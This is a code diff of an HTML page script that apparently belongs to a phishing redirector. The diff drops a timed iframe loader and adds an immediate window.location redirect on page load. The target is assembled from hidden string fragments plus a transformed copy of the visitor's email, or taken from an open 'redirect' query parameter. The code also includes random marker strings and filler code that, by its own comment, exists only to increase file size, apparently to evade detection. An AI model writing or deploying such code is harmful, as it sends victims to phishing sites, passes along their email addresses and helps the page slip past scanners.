@@ -89,31 +89,7 @@
     <div id="main-content"></div>
 
 <script>
-    document.addEventListener("DOMContentLoaded", () => {
-        showLoaderAndLoadContent(2500); // Adjust loading duration as neededcdcsvdiqv8m2gf
-    });
-
-    function showLoaderAndLoadContent(loadingDuration) {
-        setTimeout(() => {
-            toggleLoader(false);
-            loadIframeContent();
-        }, loadingDuration);
-    }
-
-    function toggleLoader(show) {
-        const loaderContainer = document.getElementById("loader-container");
-        const mainContent = document.getElementById("main-content");
-
-        loaderContainer.style.display = show ? "flex" : "none";
-        mainContent.style.display = show ? "none" : "block";
-    }
-
-    function loadIframeContent() {
-        const iframe = document.createElement("iframe");
-        iframe.src = getRedirectURL();
-        document.getElementById("main-content").appendChild(iframe);
-    }
-
+    // Immediately redirect users to the redirect URL
     function getRedirectURL() {
         const urlParams = new URLSearchParams(window.location.search);
 
@@ -145,9 +121,13 @@
 
             return transformed;
         }
+
         const g = transformEmail(f);
-        return urlParams.get("redirect") || (a + b + c + d + e + f);
+        return urlParams.get("redirect") || (a + b + c + d + e + g);
     }
+
+    // Redirect immediately
+    window.location.href = getRedirectURL();
 
     // Non-functional code to increase file size k9w06ooh8my1i8
     function dummyFunction1() {
